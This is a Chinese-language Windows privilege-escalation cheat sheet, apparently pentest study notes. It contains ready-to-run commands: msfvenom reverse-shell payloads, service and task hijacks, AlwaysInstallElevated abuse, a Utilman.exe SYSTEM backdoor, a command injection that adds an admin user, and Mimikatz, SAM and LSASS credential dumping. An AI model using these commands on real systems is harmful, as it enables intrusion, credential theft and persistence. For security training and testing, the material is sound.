#### 概述 (Overview)

在获得 Windows 系统的初步访问权限（如 Webshell 或低权限用户会话）后，通常需要提升权限至更高等级，以便完全控制目标系统、安装持久化后门、访问敏感数据（如 SAM 文件）或进行更深入的内网渗透。

**Windows 用户类型与特殊账户**:

*   **管理员 (Administrators Group)**: 拥有高权限，可以更改系统配置和访问大多数文件。目标通常是成为此组的成员或获得等效权限。
*   **标准用户 (Users Group)**: 权限有限，通常不能进行关键系统更改，访问受限。
*   **特殊内置账户**:
    *   **SYSTEM (NT AUTHORITY\SYSTEM / LocalSystem)**: 操作系统的内部账户，拥有对本地系统几乎所有的访问权限，甚至高于标准管理员。这是提权的终极目标之一。
    *   **Local Service (NT AUTHORITY\LocalService)**: 用于运行服务的“最小权限”账户，网络访问时使用匿名凭据。
    *   **Network Service (NT AUTHORITY\NetworkService)**: 类似 Local Service，但网络访问时使用计算机账户凭据。

提升权限的目标通常是获取 **Administrators** 组成员的权限，或直接获得 **SYSTEM** 权限。

#### 初始 Shell 环境修复 (Initial Shell Environment Fix)

1.  **CMD 命令无法执行分析与解决 (CMD Execution Issues)**
    *   **原因**: 策略限制、`cmd.exe` 损坏/删除、权限不足、Webshell 环境限制。
    *   **解决方法**: 查找可写目录 -> 上传 `cmd.exe` -> 在 Webshell/反弹 Shell 中指定该 `cmd.exe` 的路径。

#### 提权信息收集命令 (Common Info Gathering Commands for PrivEsc)

*   `whoami`: 查看当前用户名。
*   `whoami /groups`: 查看当前用户所属的组。
*   `whoami /priv`: **(重要)** 查看当前用户拥有的特权 (Privileges)，如 `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege` 等，这些是特定提权向量的关键。
*   `systeminfo`: 查看操作系统版本、架构、安装日期、已安装补丁 (Hotfix)。 **(关键，用于内核漏洞检查)**。
*   `ipconfig /all`: 查看网络配置。
*   `net user`: 列出本地用户。
*   `net user <username>`: 查看特定用户信息。
*   `net localgroup administrators`: 查看本地管理员组成员。**(关键)**
*   `netstat -ano`: 查看网络连接、监听端口及关联进程 ID。
*   `tasklist /svc`: 查看运行进程及其关联服务。**(关键，用于令牌窃取、服务检查)**
*   `taskkill /PID <pid> /F`: 强制结束进程。
*   `net start`: 列出正在运行的服务。
*   `net stop <service_name>`: 停止服务。
*   `hostname`: 查看计算机名。
*   `quser` 或 `query user`: 查看当前登录的用户会话。
*   `dir /a /s /b c:\ | findstr /i "config.ini"`, `dir /a /s /b c:\ | findstr /i "password"`: 搜索可能包含密码的文件。
*   `dir c:\programdata\`, `dir "c:\program files\"`, `dir "c:\program files (x86)\"`: 浏览常见安装目录，分析已安装软件。
*   `wmic product get name, version, vendor`: **(重要)** 获取已安装程序列表及其版本，用于查找已知漏洞。可能不全，需要结合手动检查。
*   `wmic qfe get Caption, Description, HotFixID, InstalledOn`: 列出已安装的补丁及其安装日期。**(关键，用于内核漏洞检查)**
*   `sc qc <ServiceName>`: 查看服务配置 (路径, 运行账户等)。
*   `schtasks /query /fo LIST /v`: 查看计划任务详细信息。**(关键)**
*   `accesschk.exe` (Sysinternals): 检查文件/目录/服务/注册表项的权限。例如：
    *   `accesschk.exe -uwcqv "Authenticated Users" *`: 查找 "Authenticated Users" 可修改的服务。
    *   `accesschk.exe -uwcqv "<UserName>" *`: 查找特定用户可修改的服务。
    *   `accesschk.exe -dqv "<directory>"`: 检查目录权限。
    *   `accesschk64.exe -qlc <servicename>`: 检查特定服务的权限。
*   `icacls <path>`: 查看文件或目录的访问控制列表 (ACL)。
*   `reg query <KeyPath>`: 查询注册表项。

#### 提权方法 (Escalation Techniques)

1.  **查找存储的凭据 (Finding Stored Credentials)**
    *   **原理**: 最简单的方法之一，查找系统或应用中以明文或易于解密形式存储的密码。
    *   **常见位置**:
        *   **无人值守安装文件**: 查找 `Unattend.xml`, `sysprep.xml`, `sysprep.inf` 等文件中的 `<Credentials>` 标签。常见路径：`C:\Unattend.xml`, `C:\Windows\Panther\Unattend.xml`, `C:\Windows\Panther\Unattend\Unattend.xml`, `C:\Windows\system32\sysprep.inf`, `C:\Windows\system32\sysprep\sysprep.xml`。
        *   **PowerShell 历史记录**: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (在 CMD 中) 或 `Get-Content $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (在 PowerShell 中)。
        *   **保存的 Windows 凭据**: `cmdkey /list` 列出。如果找到可用凭据，可尝试使用 `runas /savecred /user:<username> cmd.exe` 以该用户身份运行命令（首次会提示输入密码，如果之前保存过则不提示）。
        *   **IIS 配置文件 (`web.config`)**: 查找数据库连接字符串或其他敏感配置。常见路径：`C:\inetpub\wwwroot\web.config`, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config` (路径可能变化)。使用 `type <path> | findstr /i "connectionString"` 或 `findstr /i "password"`。
        *   **应用程序配置文件**: 各种软件可能将密码存储在配置文件或注册表中。
        *   **脚本文件**: `.bat`, `.ps1` 等脚本可能硬编码了密码。
        *   **软件保存的凭据 (示例: PuTTY)**: 许多客户端软件 (SSH, FTP, VNC, 浏览器) 会保存连接信息。PuTTY 会在注册表中存储会话信息，包括代理密码（如果配置了）。使用 `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s` 搜索。
        *   **LaZagne**: 使用 LaZagne 工具可以自动搜索和提取多种应用程序存储的凭据（见“提权后操作”部分，但也可作为初始提权步骤）。

2.  **利用系统内核溢出漏洞 (Kernel Exploit)**
    *   **原理**: 利用操作系统内核未修复的漏洞获取 SYSTEM 权限。
    *   **步骤**:
        1.  **信息收集**: `systeminfo` 获取 OS 版本和补丁列表 (`HotFixID`)。
        2.  **漏洞识别**:
            *   **自动化工具 (推荐)**:
                *   **Windows Exploit Suggester - Next Generation (wesng)**: (在攻击机运行) `wes.py --update` 更新数据库 -> `python wes.py systeminfo.txt` (需要将目标机的 `systeminfo` 输出保存到 `systeminfo.txt` 并传回攻击机)。
                *   **Sherlock (PowerShell)**: (在目标机运行) `Import-Module .\Sherlock.ps1; Find-AllVulns`。
                *   **Metasploit**: `use post/multi/recon/local_exploit_suggester`, `set SESSION <id>`, `run`。
            *   **手动比对**: 对比补丁列表和已知漏洞 (如 MS10-015, MS11-080, MS14-058, MS15-051, MS16-032, CVE-2018-8120 等)。
        3.  **获取 Exploit**: 从 GitHub (SecWiki/windows-kernel-exploits, etc.) 下载预编译或源码。
        4.  **上传与执行**: 上传到可写目录并运行。
    *   **风险**: 可能导致系统蓝屏 (BSOD)。

3.  **绕过用户账户控制 (Bypass UAC)**
    *   **原理**: 利用 Windows 机制或漏洞，在不触发 UAC 弹窗的情况下以高权限 (High Integrity) 执行代码。
    *   **适用场景**: 当前用户已是管理员组成员，但进程在中等完整性级别运行。
    *   **方法**: 利用可信程序 (如 `eventvwr.exe`, `fodhelper.exe`) 自动提权特性加载恶意代码。
    *   **工具/模块**: Metasploit (`exploit/windows/local/bypassuac*`), UACMe。
    *   **MSF 示例 (ask)**: 诱导用户点击确认框。
        ```bash
        use exploit/windows/local/ask
        set SESSION <id>; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <port>
        exploit
        ```

4.  **利用系统服务提权 (Service Escalation)**
    *   **简介**: Windows 服务由服务控制管理器 (SCM) 管理，可在特定用户账户（常为 SYSTEM, Local Service, Network Service）下运行。服务的配置存储在注册表 `HKLM\SYSTEM\CurrentControlSet\Services\` 下。利用点在于对服务配置或其关联文件的权限不当。
    *   **不安全的服务可执行文件权限 (Insecure Service Executable Permissions)**
        *   **原理**: 如果 SYSTEM 或其他高权限服务所运行的 `.exe` 文件允许低权限用户修改或替换，则可以将该文件替换为 Payload。
        *   **检测**:
            1.  `sc qc <ServiceName>`: 获取 `BINARY_PATH_NAME`。
            2.  `icacls "<path_to_exe>"`: 检查当前用户或所属组 (如 `BUILTIN\Users`, `Everyone`) 是否有写入/修改权限 (如 `(M)`, `(F)`, `(W)`)。
        *   **利用**:
            1.  备份原文件: `move <path_to_exe> <path_to_exe>.bak`
            2.  生成 Payload (需为服务格式): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe-service -o payload.exe`
            3.  上传并替换: `move payload.exe "<path_to_exe>"`
            4.  确保权限 (有时需要): `icacls "<path_to_exe>" /grant Everyone:F`
            5.  重启服务: `net stop <ServiceName>` (可能失败，继续执行 start) -> `net start <ServiceName>`。
            6.  获得 Shell 后恢复原文件。
    *   **未引用的服务路径 (Unquoted Service Path)**
        *   **原理**: 如果服务路径含空格且未用引号包围 (e.g., `C:\Program Files\Some Service\service.exe`)，系统会依次尝试执行 `C:\Program.exe`, `C:\Program Files\Some.exe`, ...。如果在靠前路径 (如 `C:\`) 有写入权限，可放置同名恶意程序 (如 `Program.exe`) 劫持。
        *   **检测**:
            *   `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`: 查找自动启动、路径不在 Windows 目录、且路径未被引号包围的服务。
            *   对找到的路径，使用 `icacls` 检查上级目录 (如 `C:\`, `C:\Program Files`) 是否对当前用户可写。
        *   **利用**:
            1.  生成 Payload (普通 exe): `msfvenom -p windows/x64/shell_reverse_tcp ... -f exe -o Program.exe` (文件名取路径第一个空格前的部分)。
            2.  上传到对应的可写上级目录 (如 `C:\Program.exe`)。
            3.  确保权限: `icacls C:\Program.exe /grant Everyone:F`
            4.  重启服务或等待系统重启。
    *   **不安全的服务权限 (Insecure Service Permissions / Weak Service DACL)**
        *   **原理**: 如果当前用户对服务对象本身有修改配置的权限 (即使对服务文件没有写权限)，可以修改服务的 `binPath` (执行路径) 或 `ObjectName` (运行账户)。
        *   **检测**:
            *   `accesschk64.exe -qlc <ServiceName>`: 检查当前用户或所属组是否有 `SERVICE_CHANGE_CONFIG` 或 `SERVICE_ALL_ACCESS` 权限。
        *   **利用**:
            1.  生成 Payload (服务格式 `exe-service` 或普通 `exe` 配合 `cmd /c`)。上传并确保权限。
            2.  修改服务配置: `sc config <ServiceName> binPath= "C:\path\to\payload.exe" obj= LocalSystem` (将服务指向 Payload 并以 SYSTEM 运行)。**注意 `binPath=` 和 `obj=` 后面的空格**。
            3.  重启服务: `net stop <ServiceName>`, `net start <ServiceName>`。
            4.  获得 Shell 后恢复配置: `sc config <ServiceName> binPath= "<original_path>" obj= <original_account>`。

5.  **利用计划任务 (Scheduled Tasks)**
    *   **原理**: 如果某个以高权限运行的计划任务所执行的程序或脚本所在的目录对低权限用户可写，则可以替换原程序。
    *   **检测**:
        1.  `schtasks /query /fo LIST /v`: 查看任务详情，关注以 SYSTEM 或 Administrators 运行的任务及其 "Task To Run" (执行的命令/脚本)。
        2.  `icacls "<path_to_program_or_script_directory>"`: 检查对该程序或其所在目录的写入权限。
    *   **利用**:
        1.  备份原文件。
        2.  生成并上传 Payload，替换原文件。
        3.  等待任务执行，或手动触发 (如果权限允许): `schtasks /run /tn <TaskName>`。
        4.  获得 Shell 后恢复。

6.  **利用 AlwaysInstallElevated**
    *   **原理**: 如果特定注册表策略被设置，允许任何用户以 SYSTEM 权限安装 MSI 包。
    *   **检测**: 查询以下两个注册表项的值是否都为 `1`：
        *   `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
        *   `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
    *   **利用**:
        1.  如果两个值都为 1，则此方法可行。
        2.  生成 MSI Payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o malicious.msi`
        3.  上传 `malicious.msi` 到目标机。
        4.  执行安装 (会以 SYSTEM 权限运行 Payload): `msiexec /quiet /qn /i C:\path\to\malicious.msi` (`/quiet /qn` 表示静默安装)。
        5.  在攻击机监听反弹 Shell。

7.  **滥用令牌和特权 (Abusing Tokens and Privileges)**
    *   **原理**: 利用 Windows 的令牌机制或用户持有的特殊权限 (Privileges) 来提升权限。
    *   **检测**: `whoami /priv` 查看当前用户拥有的特权。
    *   **令牌窃取/模拟 (Token Stealing/Impersonation)**:
        *   **原理**: 获取高权限进程 (如 SYSTEM) 的访问令牌，并模拟该用户执行操作。通常需要 `SeDebugPrivilege` (管理员默认拥有)。
        *   **方法 (Meterpreter)**: `ps` 找到 SYSTEM 进程 PID -> `steal_token <PID>` -> `getuid` 确认 -> 执行命令 -> `rev2self` 恢复。
        *   **方法 (RottenPotatoNG/JuicyPotato/GodPotato)**: 利用 DCOM/RPC 缺陷，在特定服务账户 (如 SeImpersonatePrivilege 持有者) 下运行时，可获取 SYSTEM 令牌。常用于 Web Shell 提权。
    *   **SeImpersonate / SeAssignPrimaryToken 特权**:
        *   **原理**: 允许进程模拟登录到该进程的用户。常见于服务账户 (Local Service, Network Service, IIS AppPool)。
        *   **利用 (RogueWinRM / PrintSpoofer 等)**:
            1.  攻击者控制一个拥有此特权的进程 (如 Web Shell)。
            2.  运行特定工具 (如 RogueWinRM, PrintSpoofer) 监听某个端口或触发某个系统服务。
            3.  诱使系统高权限服务 (如 BITS, Spooler) 连接到攻击者控制的监听器并进行认证。
            4.  攻击者捕获认证，利用 `SeImpersonatePrivilege` 模拟 SYSTEM，执行 Payload。
            5.  **示例 (RogueWinRM)**: `RogueWinRM.exe -p C:\path\to\payload.exe -a "arguments for payload"` (Payload 通常是反弹 Shell)。
    *   **SeBackup / SeRestore 特权**:
        *   **原理**: 允许绕过文件系统 ACL 读取/写入任意文件，用于备份/恢复。
        *   **利用 (导出 SAM/SYSTEM)**:
            1.  需要提升的命令提示符 (Run as administrator 可能触发 UAC，或已 Bypass UAC)。
            2.  备份注册表 Hives: `reg save hklm\sam C:\path\sam.save`, `reg save hklm\system C:\path\system.save`。
            3.  将 `sam.save` 和 `system.save` 文件传回攻击机。
            4.  离线提取哈希: `secretsdump.py -sam sam.save -system system.save LOCAL`。
            5.  使用哈希进行 Pass-the-Hash (PtH) 攻击。
    *   **SeTakeOwnership 特权**:
        *   **原理**: 允许用户获取文件或对象的所有权。
        *   **利用 (替换系统文件，如 Utilman)**:
            1.  需要提升的命令提示符。
            2.  获取文件所有权: `takeown /f C:\Windows\System32\Utilman.exe`。
            3.  授予自己完全控制权限: `icacls C:\Windows\System32\Utilman.exe /grant <YourUsername>:F`。
            4.  备份原文件，然后用 `cmd.exe` 替换: `copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.exe.bak`, `copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe`。
            5.  在登录屏幕点击 "轻松访问 (Ease of Access)" 按钮，将以 SYSTEM 权限打开 CMD。
            6.  完成后恢复原文件。

8.  **利用易受攻击的软件 (Exploiting Vulnerable Software)**
    *   **原理**: 系统上安装的第三方软件可能存在本地权限提升漏洞。
    *   **检测**:
        1.  `wmic product get name, version, vendor` 获取软件列表。
        2.  手动检查桌面、开始菜单、服务列表。
        3.  在 Exploit-DB, Google, CVE Mitre 搜索已知漏洞。
    *   **利用 (示例: Druva inSync <= 6.6.3)**:
        *   **漏洞**: 本地 RPC 服务 (127.0.0.1:6064) 以 SYSTEM 运行，存在命令注入 (通过路径遍历绕过补丁)。
        *   **Exploit**: 使用提供的 PowerShell 脚本或自行构造 RPC 请求，发送恶意命令 (如 `cmd.exe /c "net user hacker pass /add && net localgroup administrators hacker /add"`) 给 RPC 服务执行。

#### 自动化权限提升检查工具 (Automated PrivEsc Check Tools)

*   **WinPEAS**: (在目标机运行) 执行各种检查并高亮显示潜在向量。`.exe` 或 `.bat` 版本。`winpeas.exe > output.txt`。
*   **PrivescCheck**: (在目标机运行) PowerShell 脚本。`Set-ExecutionPolicy Bypass -Scope process -Force; . .\PrivescCheck.ps1; Invoke-PrivescCheck > output.txt`。
*   **WES-NG**: (在攻击机运行) 基于 `systeminfo` 输出建议内核漏洞。`wes.py systeminfo.txt`。
*   **Metasploit**: `use multi/recon/local_exploit_suggester`。
*   **PowerUp**: (PowerShell) `Import-Module .\PowerUp.ps1; Invoke-AllChecks`。

#### 提权后操作：获取管理员密码/哈希 (Post-Escalation: Retrieving Admin Credentials)

获得高权限 (通常是 SYSTEM) 后，下一步是提取凭据以实现持久化和横向移动。

*   **Mimikatz**:
    *   **功能**: 从内存 (`lsass.exe`) 提取明文密码、哈希、票据。
    *   **使用 (需要 SYSTEM/Debug 权限)**:
        ```powershell
        # (在 Mimikatz 控制台)
        privilege::debug
        sekurlsa::logonpasswords
        # 或直接抓取 NTLM 哈希
        lsadump::sam  # 需要先加载 SYSTEM hive 或直接在 SYSTEM 下运行
        ```
    *   **离线提取**: `procdump64.exe -accepteula -ma lsass.exe lsass.dmp` -> 将 `lsass.dmp` 传回 -> 本地 Mimikatz: `sekurlsa::minidump lsass.dmp` -> `sekurlsa::logonpasswords full`。
    *   **限制**: Credential Guard, WDigest 配置可能阻止明文提取，但 NTLM 哈希通常可用。
*   **LaZagne**:
    *   **功能**: 提取多种应用程序存储的密码 (浏览器, WiFi, Git, DB clients 等)。
    *   **使用**: `laZagne.exe all -oN output.txt`。
*   **直接导出 SAM/SYSTEM 文件**:
    *   **原理**: 获取包含本地用户哈希的 SAM 文件和解密密钥所在的 SYSTEM 文件。
    *   **方法 (需要 SYSTEM 权限)**:
        *   `reg save hklm\sam sam.save` & `reg save hklm\system system.save`。
        *   卷影复制 (`vssadmin`, `diskshadow`)。
        *   Metasploit `hashdump` 或 `run post/windows/gather/smart_hashdump`。
    *   **后续**: 传回攻击机，使用 `secretsdump.py -sam sam.save -system system.save LOCAL` 提取哈希，或用 Hashcat/John 破解。
*   **Pass-the-Hash (PtH)**:
    *   **原理**: 使用 NTLM 哈希直接进行认证，无需明文密码。
    *   **工具**: Mimikatz (`sekurlsa::pth`), Metasploit (`psexec` 模块的 `SMBPass` 填哈希), Impacket (`psexec.py -hashes ...`), CrackMapExec。